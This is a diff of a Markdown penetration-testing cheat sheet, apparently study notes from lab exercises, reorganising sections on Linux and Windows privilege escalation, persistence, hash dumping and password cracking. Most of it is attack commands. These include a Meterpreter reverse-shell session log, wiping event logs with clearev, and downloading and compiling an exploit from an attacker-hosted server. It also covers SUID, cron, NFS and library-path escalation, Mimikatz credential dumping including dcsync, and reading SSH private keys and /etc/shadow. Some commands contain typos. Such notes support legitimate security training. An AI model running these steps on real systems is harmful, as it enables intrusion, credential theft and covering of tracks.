@@ -1019,28 +1019,11 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - this attack generates access token for you, instead of impersonating
 
 
-### [CLEARING TRACKS](#)
 
-**Clearing artifacts using metasploit `Resource Scripts`**
-```
-msf6 exploit(windows/local/persistence_service) > `run`
-[*] Started reverse TCP handler on 10.10.26.2:4444 
-[*] Running module against ATTACKDEFENSE
-[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vgdjb.exe
-[*] Creating service spMjX
-[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc
-[*] Sending stage (175174 bytes) to 10.5.31.225
-[*] Meterpreter session 2 opened (10.10.26.2:4444 -> 10.5.31.225:49743) at 2024-01-15 17:34:43 +0530  
-```
-- We can delete the artificats created by metasploit module by Resource Scripts provided by it
-    - `resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc`
-
-**Clearing Windows Event Logs usng meterpreter**
-- `clearev`
 
 ### [WINDOWS PERSISTENCE](#)
 
-**Persistence by RDP (GUI based access) or WinRM (CLI based access)**
+###### Persistence by RDP (GUI based access) or WinRM (CLI based access)
 - Requirements: We need either RDP (3389) or Winrm (5985) port open on target
 
     - First we create the account itself
@@ -1072,40 +1055,11 @@ msf6 exploit(windows/local/persistence_service) > `run`
                 - `run getgui -e -u user123 -p hacker_123321`
 
 
-### [METASPLOIT](#)
-
-- Starting / Troubleshooting DB
-    - `sudo service postgresql start`
-    - `sudo msfdb init`
-    - `sudo msfconsole` > `db_status`
-- Brute forcing
-    - `use auxiliary/scanner/ssh/ssh_login`
-    - `use auxiliary/scanner/smb/smb_login`
-
-- Searching auxiliary/scanner/*
-    - `search auxiliary/scanner/ssh`
-    - `use auxiliary/scanner/smb/smb_version`
-    - `use auxiliary/scanner/smb/smb2`
-    - `use auxiliary/scanner/smb/smb_enumusers`
-    - `use auxiliary/scanner/smb/smb_enumshares`
-    - `use auxiliary/scanner/smb/pipe_auditor`
-- Switching shell to meterpreter session
-    - `use post/multi/manage/shell_to_meterpreter`
-    - `sessions -u 1`
-
-- Post Exploit Enumeration
-    - `sysinfo`
-    - `getuid`
-
-
 
 ### [LINUX POST EXPLOIT ENUMERATION](#)
 
-**Break out of Jail shell first**
-    - `/bin/bash -i`
-    - `echo os.system('/bin/bash')`
-    - `python -c 'import pty;pty.spwan("/bin/bash")`
-**Operating System Enumeration**
+
+###### OS Enumeration
 
 - Kernel version and System architecture
     - `unmae -r`, `uname -a`
@@ -1114,7 +1068,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
 - Linux Distribution type and its version
     - `cat /etc/issue`
 
-**Users and Permissions Enumeration**
+###### Users and Privileges
 
 - Users looged in, Users last logged in
     - `id`, `who`, `whoami`, `w`, `last`
@@ -1149,9 +1103,9 @@ msf6 exploit(windows/local/persistence_service) > `run`
 - 
 
 
-**Information Enumeration**
+###### Information Enumeration
 
-- Ways to upload file
+- Possible Ways to upload file
 
     - `find / -name wget  2>/dev/null `
     - `find / -name netcat  2>/dev/null `
@@ -1181,27 +1135,27 @@ msf6 exploit(windows/local/persistence_service) > `run`
     - `find / -name python 2>/dev/null`
     - `find / -name perl 2>/dev/null`
 
-**Serivces Enumeration**
+###### Serivces Enumeration
 
 - Services Running and their Privileges
     - `ps`, `ps aux`, `ps aux | grep root`
         - check which services are running by root, and which are vulnerable
 
-**Cron Jobs Enumeration**
+###### Cron Jobs Enumeration
 
 - Checking system-wide cron jobs    
     - `crontab -l`
     - `cat /etc/crontab`
         - check cron jobs of root user, analyse content of file assosiated
 
-**File System Enumeration**
+###### File System Enumeration
 
 - How are files system mounted
     - `mount`, `df -h`
 - Are there any unmounted file-systems
     - `cat /etc/fstab`
 
-**DNS Server Enumeration**
+###### DNS Server Enumeration
 
 - Checking DNS server's used
     - (miscondifured DNS server may be vulnerble to `DNS Zone Transfer attacks`)
@@ -1209,8 +1163,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
 
 ### [LINUX PRIVILEGE ESCALATION](#)
 
-###
-**Privilege Escalation by Kernel Exploits**
+###### Kernel Exploits
 
 - Linux Exploit Suggestor
     - `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
@@ -1220,7 +1173,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
 - Exploit DB
     - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
 
-**Privilege Escalation by SUDO Permissions**
+###### SUDO Misconfigured Permissions
 
 - Privilege Escalation by SUDO (Shell Escaping)
     - `sudo man ls` > `!/bin/bash`
@@ -1275,7 +1228,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
         ```
         - `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c` > `sudo LD_LIBRARY_PATH=/tmp apache2`
 
-**Privilege Escalation by SUID Permissions**
+###### SUID Misconfigured Permissions
 
 - Privilege Escalation by - SUID (Abusing intented binary functionality using `GTFOBins`)
 
@@ -1398,7 +1351,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
         ```
         - `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }` > `export -f /usr/sbin/service` > `/usr/local/bin/suid-env2`
 
-**Privilege Escalation by Cron Jobs**
+###### Cron Jobs by Root user
 
 - Privilege Escalation - Cron (abusing cron job created by root user if found)
 
@@ -1479,7 +1432,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
         - Now we can listen on our machine, when cron job would run we get root
         - `nc -nlvp 4444`
 
-**Privilege Escalation by Exploiting SSH Keys or Password in config files**
+###### SSH Keys or Password in config files
 
 - Public and private keys are generally stored in one of the following locations:
     - `/root/.ssh/`
@@ -1515,7 +1468,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
     - `cat /etc/ssh/ssh_config` / `cat /etc/sshd/sshd_config`
     - `cat ~/.ssh/authorized_keys` / `cat ~/.ssh/identity.pub` / `cat ~/.ssh/identity` / `cat ~/.ssh/id_rsa.pub` / `cat ~/.ssh/id_rsa` / `cat ~/.ssh/id_dsa.pub` / `cat ~/.ssh/id_dsa`
 
-**Privilege Escalation by Misconfigured NFS (Network File Sharing)**
+###### Misconfigured NFS (Network File Sharing)
 
 - check for `“no_root_squash” ` in `/etc/exports` file
 
@@ -1566,7 +1519,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
     - run the binary and get Root access
         - ``./home/backup/nfs`` > `id`
 
-**Privilege Escalation by PATH writable folder**
+###### PATH writable folder
 
 Conditions Required
     - There should be a file wih SUID permission created by root user.
@@ -1593,34 +1546,9 @@ Conditions Required
         - ``./testelf` > `id`
 
 
-### [Encryption, (Hash Identification, Generation,  Dumping) and Password Cracking](#)
+### [HASH IDENTIFICATION, GENERATION & Dumping) and Password Cracking](#)
 
-**Encryption**
-
-- GNU Privacy Guard (GPG or gpg)
-    - Encrypting (need to give password in prompt)- `gpg -c file1.txt `
-    - Hiding/renaming - ` mv file1.txt.gpg critical_data.doc`
-    - Decrypting (using password in prompt)- `gpg -d critical_data.doc `
-    - Decrypting without password
-        - Bruteforce using John
-            - Convert encryted file to hash
-                - `gpg2john [encrypted gpg file] > [filename of the hash you want to create]`
-            - Brute force using John
-                - `john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]`
-
-
-- OpenSSL
-    - Encrypt file
-        - `openssl aes-256-cbc -e -in message.txt -out encrypted_message`
-    - Decrypt file
-        - `openssl aes-256-cbc -d -in encrypted_message -out original_message.txt`
-    - Encryption more secure and resilient against brute-force attacks
-        - use the Password-Based Key Derivation Function 2 (PBKDF2)
-            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message`
-        - Decryption 
-            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`
-
-**Hash Identification**
+###### Hash Identification
 
 - Linux hashes in /etc/passwd based on diffrent crypt schemes
 
@@ -1660,7 +1588,7 @@ Conditions Required
         - NT Hash - `e3c61a68f1b89ee6c8ba9507378dc88d`
         - LM Hash - `aad3b435b51404eeaad3b435b51404ee`
 
-#### Linux hashed password generation
+###### Linux password hash generation
 
 - OpenSSL
     ```
@@ -1674,55 +1602,56 @@ Conditions Required
     $6$oTvKrJiKZIcu/MLj$q8t7Ip.Plc4rfdRjyUlL9bEx2loeDcROEHph.syr/7.56YGKAPUMNkMQpavEbGo7T3nt/XXZDsuAiz7DlVFpQ.
     ```
 
-#### Hash Dumping
+###### Hash Dumping
 
-##### Windows
-###### Metasploit 
-- Using inbuilt meterpreter extension `Kiwi`
-    - Migrating to `LSASS` process
-        - `pgrep lsass` > `migrate 788`
-    - load and run kiwi
-        - `load kiwi` > `creds_all` > `lsa_dump_sam`
+- Windows
 
-- Dumping hashes using meterpreter `hashdump`
-    - `hashdump`
+    - Metasploit 
+        - Using inbuilt meterpreter extension `Kiwi`
+            - Migrating to `LSASS` process
+                - `pgrep lsass` > `migrate 788`
+            - load and run kiwi
+                - `load kiwi` > `creds_all` > `lsa_dump_sam`
 
-###### Mimikatz
+        - Dumping hashes using meterpreter `hashdump`
+            - `hashdump`
 
-- Uploading and using Mimikatz executable with meterpreter
-    - Migrating to `LSASS` process
-        - `pgrep lsass` > `migrate 788`
-    - Upload mimikatz executable
-        - `mkdir temp` > `cd temp` > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
-    - Run mimikatxz executable
-        - ` shell` > `.\mimikatz.exe ` 
-        - Confirm that you have elevated privileges that mimikatz requires and elevate our integrity to SYSTEM level.
-            - `privilege::debug` > `token::elevate`
-        - Dump the SAM database hashes
-            - `lsadump::sam`
+- Mimikatz
 
-- Using Mimikatz executable
-    - Upload executable using suitable technique
-    - Run executabel and check for provileges for '20' OK
-        - `mimikatz.exe` > `privilege::debug `
-    - Possible attacks
-        - Dump Logonpaswords of users stored in memeory of users logged in after last boot
-            - mimikatz # `sekurlsa::logonpasswords `
-        - Dump SAM which includes hashes of all users
-            - mimikatz # `lsadump::sam `
-            - mimikatz # `lsadump::sam /patch `
-        - Dump hashes of users from LSA
-            - mimikatz # `lsadump::lsa /patch `
-        - Dump password hashes from the NTDS.DIT file without need to authenticating domain controller
-            - mimikatz # `lsadump::dcsync /domain:controller.local /all /csv`
+    - Uploading and using Mimikatz executable with meterpreter
+        - Migrating to `LSASS` process
+            - `pgrep lsass` > `migrate 788`
+        - Upload mimikatz executable
+            - `mkdir temp` > `cd temp` > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
+        - Run mimikatxz executable
+            - ` shell` > `.\mimikatz.exe ` 
+            - Confirm that you have elevated privileges that mimikatz requires and elevate our integrity to SYSTEM level.
+                - `privilege::debug` > `token::elevate`
+            - Dump the SAM database hashes
+                - `lsadump::sam`
 
-###### Secretsdump.py
+    - Using Mimikatz executable
+        - Upload executable using suitable technique
+        - Run executabel and check for provileges for '20' OK
+            - `mimikatz.exe` > `privilege::debug `
+        - Possible attacks
+            - Dump Logonpaswords of users stored in memeory of users logged in after last boot
+                - mimikatz # `sekurlsa::logonpasswords `
+            - Dump SAM which includes hashes of all users
+                - mimikatz # `lsadump::sam `
+                - mimikatz # `lsadump::sam /patch `
+            - Dump hashes of users from LSA
+                - mimikatz # `lsadump::lsa /patch `
+            - Dump password hashes from the NTDS.DIT file without need to authenticating domain controller
+                - mimikatz # `lsadump::dcsync /domain:controller.local /all /csv`
 
-##### Linux
+- Secretsdump.py
+
+- Linux
 - Manually - `cat /etc/shadow`
 - Metasploit -  `post/linux/gather/hashdump`
 
-#### Password Cracking
+### PASSWORD CRACKING
 
 
 - Unshadow
@@ -1736,6 +1665,31 @@ Conditions Required
 - Hashcat
     - `hashcat -m 0 -a 0 md5.txt rockyou.txt`
     - `hashcat -m 13100  -a 0 kerberoshash ~/Downloads/rockyou.txt`
+
+### ENCRYPTION & DECRYPTION
+
+- GNU Privacy Guard (GPG or gpg)
+    - Encrypting (need to give password in prompt)- `gpg -c file1.txt `
+    - Hiding/renaming - ` mv file1.txt.gpg critical_data.doc`
+    - Decrypting (using password in prompt)- `gpg -d critical_data.doc `
+    - Decrypting without password
+        - Bruteforce using John
+            - Convert encryted file to hash
+                - `gpg2john [encrypted gpg file] > [filename of the hash you want to create]`
+            - Brute force using John
+                - `john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]`
+
+
+- OpenSSL
+    - Encrypt file
+        - `openssl aes-256-cbc -e -in message.txt -out encrypted_message`
+    - Decrypt file
+        - `openssl aes-256-cbc -d -in encrypted_message -out original_message.txt`
+    - Encryption more secure and resilient against brute-force attacks
+        - use the Password-Based Key Derivation Function 2 (PBKDF2)
+            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message`
+        - Decryption 
+            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`
 
 ### [Windows Alternate Authentication (NTLM and Kerberos)](#)
 By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work.
@@ -1965,3 +1919,21 @@ alternatives available for NTLM and Kerberos auth are as follows.
     - `use windows/http/badblue_passthru` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set LPORT 4433` > `exploit`
 
 
+### [CLEARING TRACKS](#)
+
+**Clearing artifacts using metasploit `Resource Scripts`**
+```
+msf6 exploit(windows/local/persistence_service) > `run`
+[*] Started reverse TCP handler on 10.10.26.2:4444 
+[*] Running module against ATTACKDEFENSE
+[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vgdjb.exe
+[*] Creating service spMjX
+[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc
+[*] Sending stage (175174 bytes) to 10.5.31.225
+[*] Meterpreter session 2 opened (10.10.26.2:4444 -> 10.5.31.225:49743) at 2024-01-15 17:34:43 +0530  
+```
+- We can delete the artificats created by metasploit module by Resource Scripts provided by it
+    - `resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc`
+
+**Clearing Windows Event Logs usng meterpreter**
+- `clearev`
